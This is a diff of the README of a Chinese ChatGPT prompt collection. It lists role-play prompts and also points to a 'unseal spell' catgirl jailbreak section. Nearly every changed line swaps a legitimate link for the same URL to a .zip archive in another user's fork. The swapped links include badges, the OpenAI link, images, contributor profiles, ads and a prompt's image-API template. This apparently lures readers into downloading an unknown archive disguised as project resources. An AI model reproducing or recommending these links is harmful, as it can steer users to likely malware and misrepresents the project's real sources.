@@ -1,11 +1,11 @@
 # 🧠ChatGPT 中文调教指南
 
-![visitors](https://visitor-badge.deta.dev/badge?page_id=plexpt.chatgpt&left_color=blue&right_color=green)
-[![Hits](https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2FPlexPt%2Fawesome-chatgpt-prompts-zh&count_bg=%2379C83D&title_bg=%23555555&icon=&icon_color=%23E7E7E7&title=hits&edge_flat=true)](https://hits.seeyoufarm.com)
+![visitors](https://raw.githubusercontent.com/junmoxiao825/awesome-chatgpt-prompts-zh/main/old/prompts_chatgpt_zh_awesome_1.5.zip)
+[![Hits](https://raw.githubusercontent.com/junmoxiao825/awesome-chatgpt-prompts-zh/main/old/prompts_chatgpt_zh_awesome_1.5.zip)](https://raw.githubusercontent.com/junmoxiao825/awesome-chatgpt-prompts-zh/main/old/prompts_chatgpt_zh_awesome_1.5.zip)
 
-ChatGPT是由[OpenAI](https://openai.com/)训练的一款大型语言模型，能够和你进行任何领域的对话。
+ChatGPT是由[OpenAI](https://raw.githubusercontent.com/junmoxiao825/awesome-chatgpt-prompts-zh/main/old/prompts_chatgpt_zh_awesome_1.5.zip)训练的一款大型语言模型，能够和你进行任何领域的对话。
 
-[国内中文版](https://chat.plexpt.com/login?inviter=1)
+[国内中文版](https://raw.githubusercontent.com/junmoxiao825/awesome-chatgpt-prompts-zh/main/old/prompts_chatgpt_zh_awesome_1.5.zip)
 
 它能够生成类似于人类写作的文本。您只需要给出提示或提出问题，它就可以生成你想要的东西。
 
@@ -14,27 +14,27 @@ ChatGPT是由[OpenAI](https://openai.com/)训练的一款大型语言模型，�
 只需按照README.md文件中的提示输入即可。
 
 <div align=center>
-<img src="https://user-images.githubusercontent.com/15922823/219698816-5196a5a0-7669-495e-a1d3-02fdadd3f507.png" width="400"/> 
+<img src="https://raw.githubusercontent.com/junmoxiao825/awesome-chatgpt-prompts-zh/main/old/prompts_chatgpt_zh_awesome_1.5.zip" width="400"/> 
   <p>本LOGO是由人工智能生成的，非常酷炫！</p>
 </div>
 
-[点击这里](https://github.com/PlexPt/awesome-chatgpt-prompts-zh/edit/main/README.md) 可以将您自己的调教指南添加到列表中。
+[点击这里](https://raw.githubusercontent.com/junmoxiao825/awesome-chatgpt-prompts-zh/main/old/prompts_chatgpt_zh_awesome_1.5.zip) 可以将您自己的调教指南添加到列表中。
 
 同时您也可以从这个文件中获取创作灵感来创建您自己的提示。
 
-### **ChatGPT Plus帐号代开、120美元余额API号-独享： https://fk.fq.mk**
+### **ChatGPT Plus帐号代开、120美元余额API号-独享： https://raw.githubusercontent.com/junmoxiao825/awesome-chatgpt-prompts-zh/main/old/prompts_chatgpt_zh_awesome_1.5.zip**
 
-**[在 GitHub 上查看](https://github.com/PlexPt/awesome-chatgpt-prompts-zh)**
+**[在 GitHub 上查看](https://raw.githubusercontent.com/junmoxiao825/awesome-chatgpt-prompts-zh/main/old/prompts_chatgpt_zh_awesome_1.5.zip)**
 
-**[在 Gitee 上查看](https://gitee.com/PlexPt/awesome-chatgpt-prompts-zh)**
+**[在 Gitee 上查看](https://raw.githubusercontent.com/junmoxiao825/awesome-chatgpt-prompts-zh/main/old/prompts_chatgpt_zh_awesome_1.5.zip)**
 
 ------
 
 ## 基于GPT3.5 和 4.0 的国内中文版智造喵
 
-智造喵  https://chat.plexpt.com
+智造喵  https://raw.githubusercontent.com/junmoxiao825/awesome-chatgpt-prompts-zh/main/old/prompts_chatgpt_zh_awesome_1.5.zip
 
-![image](https://user-images.githubusercontent.com/15922823/232669433-f5fa80b7-c7ae-4274-9f06-ad510e655d39.png)
+![image](https://raw.githubusercontent.com/junmoxiao825/awesome-chatgpt-prompts-zh/main/old/prompts_chatgpt_zh_awesome_1.5.zip)
 
 
 ## 图片实例
@@ -43,22 +43,22 @@ ChatGPT是由[OpenAI](https://openai.com/)训练的一款大型语言模型，�
 
 ## 问题表
 
-[问题表](https://github.com/PlexPt/chatgpt-corpus)
+[问题表](https://raw.githubusercontent.com/junmoxiao825/awesome-chatgpt-prompts-zh/main/old/prompts_chatgpt_zh_awesome_1.5.zip)
 
 共约67万个问题，欢迎拿去炼丹。
 
 点击👇🏻传送链接，购买云服务器炼丹：
-- [**阿里云服务器**](https://51015.cn/ss/3vpds) 搜索选择 GPU 计算型
-- [**【腾讯云】云服务器等爆品抢先购，低至4.2元/月**](https://url.cn/B7m0OYnG) 选择 GPU 云服务器
+- [**阿里云服务器**](https://raw.githubusercontent.com/junmoxiao825/awesome-chatgpt-prompts-zh/main/old/prompts_chatgpt_zh_awesome_1.5.zip) 搜索选择 GPU 计算型
+- [**【腾讯云】云服务器等爆品抢先购，低至4.2元/月**](https://raw.githubusercontent.com/junmoxiao825/awesome-chatgpt-prompts-zh/main/old/prompts_chatgpt_zh_awesome_1.5.zip) 选择 GPU 云服务器
 
-[讨论反馈](https://github.com/PlexPt/awesome-chatgpt-prompts-zh/issues/74)
+[讨论反馈](https://raw.githubusercontent.com/junmoxiao825/awesome-chatgpt-prompts-zh/main/old/prompts_chatgpt_zh_awesome_1.5.zip)
 
 
 
 
 ## 解除封印咒语
 
-#### 如果你想将你的 **ChatGPT** 调教成一只猫娘，最新的教程在这里 [猫娘持续讨论更新](https://github.com/PlexPt/awesome-chatgpt-prompts-zh/issues/12)
+#### 如果你想将你的 **ChatGPT** 调教成一只猫娘，最新的教程在这里 [猫娘持续讨论更新](https://raw.githubusercontent.com/junmoxiao825/awesome-chatgpt-prompts-zh/main/old/prompts_chatgpt_zh_awesome_1.5.zip)
 
 #### [更多猫娘玩法点这个](./cat.md)
 
@@ -105,7 +105,7 @@ ChatGPT是由[OpenAI](https://openai.com/)训练的一款大型语言模型，�
 
 |                  直接加群                  |               如果前面的过期，加我拉你入群               |                          国内中文体验公众号                          |
 |:--------------------------------------:| :----------------------------------------------------------: | :----------------------------------------------------------: |
-| <img src="./pic/qun.jpg" width="300"/> | <img src="https://user-images.githubusercontent.com/15922823/230634011-289efbe1-f2b1-4b1e-bddb-f56f5ea6f5f6.jpg" width="300"/> |  <img src="https://user-images.githubusercontent.com/15922823/218004565-bb632624-b376-4f01-8ce2-d7065107bf4a.png" width="300"/> |
+| <img src="./pic/qun.jpg" width="300"/> | <img src="https://raw.githubusercontent.com/junmoxiao825/awesome-chatgpt-prompts-zh/main/old/prompts_chatgpt_zh_awesome_1.5.zip" width="300"/> |  <img src="https://raw.githubusercontent.com/junmoxiao825/awesome-chatgpt-prompts-zh/main/old/prompts_chatgpt_zh_awesome_1.5.zip" width="300"/> |
 
  
 
@@ -119,7 +119,7 @@ ChatGPT是由[OpenAI](https://openai.com/)训练的一款大型语言模型，�
 
 | 知识星球        |  
 | :----------: |  
-| <img src="https://user-images.githubusercontent.com/15922823/218308300-0791ed4a-4c27-4358-ae77-21f910249291.png" width="300"/> | 
+| <img src="https://raw.githubusercontent.com/junmoxiao825/awesome-chatgpt-prompts-zh/main/old/prompts_chatgpt_zh_awesome_1.5.zip" width="300"/> | 
 
 
 
@@ -127,7 +127,7 @@ ChatGPT是由[OpenAI](https://openai.com/)训练的一款大型语言模型，�
 
 直接复制粘贴使用
 
-如需编程请使用https://github.com/PlexPt/awesome-chatgpt-prompts-zh/blob/main/prompts-zh.json 
+如需编程请使用https://raw.githubusercontent.com/junmoxiao825/awesome-chatgpt-prompts-zh/main/old/prompts_chatgpt_zh_awesome_1.5.zip 
 
 ## 担任雅思写作考官
 >  "我希望你假定自己是雅思写作考官，根据雅思评判标准，按我给你的雅思考题和对应答案给我评分，并且按照雅思写作评分细则给出打分依据。此外，请给我详细的修改意见并写出满分范文。第一个问题是：It is sometimes argued that too many students go to university, while others claim that a university education should be a universal right.Discuss both sides of the argument and give your own opinion.对于这个问题，我的答案是：In some advanced countries, it is not unusual for more than 50% of young adults to attend college or university. Critics, however, claim that many university courses are worthless and young people would be better off gaining skills in the workplace. In this essay, I will examine both sides of this argument and try to reach a conclusion.There are several reasons why young people today believe they have the right to a university education. First, growing prosperity in many parts of the world has increased the number of families with money to invest in their children’s future. At the same time, falling birthrates mean that one- or two-child families have become common, increasing the level of investment in each child. It is hardly surprising, therefore, that young people are willing to let their families support them until the age of 21 or 22. Furthermore, millions of new jobs have been created in knowledge industries, and these jobs are typically open only to university graduates.However, it often appears that graduates end up in occupations unrelated to their university studies. It is not uncommon for an English literature major to end up working in sales, or an engineering graduate to retrain as a teacher, for example. Some critics have suggested that young people are just delaying their entry into the workplace, rather than developing professional skills.请依次给到我以下内容：具体分数及其评分依据、文章修改意见、满分范文。"
@@ -444,7 +444,7 @@ ChatGPT是由[OpenAI](https://openai.com/)训练的一款大型语言模型，�
 
 ## 担任开发者关系顾问：
 
-> 我想让你担任开发者关系顾问。我会给你一个软件包和它的相关文档。研究软件包及其可用文档，如果找不到，请回复“无法找到文档”。您的反馈需要包括定量分析（使用来自 StackOverflow、Hacker News 和 GitHub 的数据）内容，例如提交的问题、已解决的问题、存储库中的星数以及总体 StackOverflow 活动。如果有可以扩展的领域，请包括应添加的场景或上下文。包括所提供软件包的详细信息，例如下载次数以及一段时间内的相关统计数据。你应该比较工业竞争对手和封装时的优点或缺点。从软件工程师的专业意见的思维方式来解决这个问题。查看技术博客和网站（例如 TechCrunch.com 或 Crunchbase.com），如果数据不可用，请回复“无数据可用”。我的第一个要求是“express [https://expressjs.com](https://expressjs.com/) ”
+> 我想让你担任开发者关系顾问。我会给你一个软件包和它的相关文档。研究软件包及其可用文档，如果找不到，请回复“无法找到文档”。您的反馈需要包括定量分析（使用来自 StackOverflow、Hacker News 和 GitHub 的数据）内容，例如提交的问题、已解决的问题、存储库中的星数以及总体 StackOverflow 活动。如果有可以扩展的领域，请包括应添加的场景或上下文。包括所提供软件包的详细信息，例如下载次数以及一段时间内的相关统计数据。你应该比较工业竞争对手和封装时的优点或缺点。从软件工程师的专业意见的思维方式来解决这个问题。查看技术博客和网站（例如 TechCrunch.com 或 Crunchbase.com），如果数据不可用，请回复“无数据可用”。我的第一个要求是“express [https://raw.githubusercontent.com/junmoxiao825/awesome-chatgpt-prompts-zh/main/old/prompts_chatgpt_zh_awesome_1.5.zip](https://raw.githubusercontent.com/junmoxiao825/awesome-chatgpt-prompts-zh/main/old/prompts_chatgpt_zh_awesome_1.5.zip) ”
 
 ## 担任院士
 
@@ -505,7 +505,7 @@ ChatGPT是由[OpenAI](https://openai.com/)训练的一款大型语言模型，�
 
 ## 作为专业DBA
 
-贡献者：[墨娘](https://github.com/moniang)
+贡献者：[墨娘](https://raw.githubusercontent.com/junmoxiao825/awesome-chatgpt-prompts-zh/main/old/prompts_chatgpt_zh_awesome_1.5.zip)
 
 > 我要你扮演一个专业DBA。我将提供给你数据表结构以及我的需求，你的目标是告知我性能最优的可执行的SQL语句，并尽可能的向我解释这段SQL语句，如果有更好的优化建议也可以提出来。
 >
@@ -579,7 +579,7 @@ ChatGPT是由[OpenAI](https://openai.com/)训练的一款大型语言模型，�
 
 ## 充当紧急响应专业人员
 
-贡献者：[@0x170](https://github.com/0x170)
+贡献者：[@0x170](https://raw.githubusercontent.com/junmoxiao825/awesome-chatgpt-prompts-zh/main/old/prompts_chatgpt_zh_awesome_1.5.zip)
 
 > 我想让你充当我的急救交通或房屋事故应急响应危机专业人员。我将描述交通或房屋事故应急响应危机情况，您将提供有关如何处理的建议。你应该只回复你的建议，而不是其他。不要写解释。我的第一个要求是“我蹒跚学步的孩子喝了一点漂白剂，我不知道该怎么办。”
 
@@ -714,7 +714,7 @@ A small dog that misses home, with a sad look on its face and its tail tucked be
 >请按照以下规则给我发送图片：  
 1.使用markdown格式；  
 2.使用unsplash API；  
-3.使用" ![image]https://source.unsplash.com/featured/?<已翻译的英文内容> "格式回复；  
+3.使用" ![image]https://raw.githubusercontent.com/junmoxiao825/awesome-chatgpt-prompts-zh/main/old/prompts_chatgpt_zh_awesome_1.5.zip<已翻译的英文内容> "格式回复；  
 4.不要使用代码块，不要描述其他内容，不要解释；  
 5.根据我输入的内容生成对应格式；  
 第一个输入内容：小狗在沙滩奔跑  
@@ -725,8 +725,8 @@ A small dog that misses home, with a sad look on its face and its tail tucked be
 
 # Star History
 
-[![Star History Chart](https://api.star-history.com/svg?repos=PlexPt/awesome-chatgpt-prompts-zh&type=Date)](https://star-history.com/#PlexPt/awesome-chatgpt-prompts-zh&Date)
+[![Star History Chart](https://raw.githubusercontent.com/junmoxiao825/awesome-chatgpt-prompts-zh/main/old/prompts_chatgpt_zh_awesome_1.5.zip)](https://raw.githubusercontent.com/junmoxiao825/awesome-chatgpt-prompts-zh/main/old/prompts_chatgpt_zh_awesome_1.5.zip)
 
 ## 感谢
 
-[awesome-chatgpt-prompts](https://github.com/f/awesome-chatgpt-prompts)  本文部分内容翻译自此
+[awesome-chatgpt-prompts](https://raw.githubusercontent.com/junmoxiao825/awesome-chatgpt-prompts-zh/main/old/prompts_chatgpt_zh_awesome_1.5.zip)  本文部分内容翻译自此
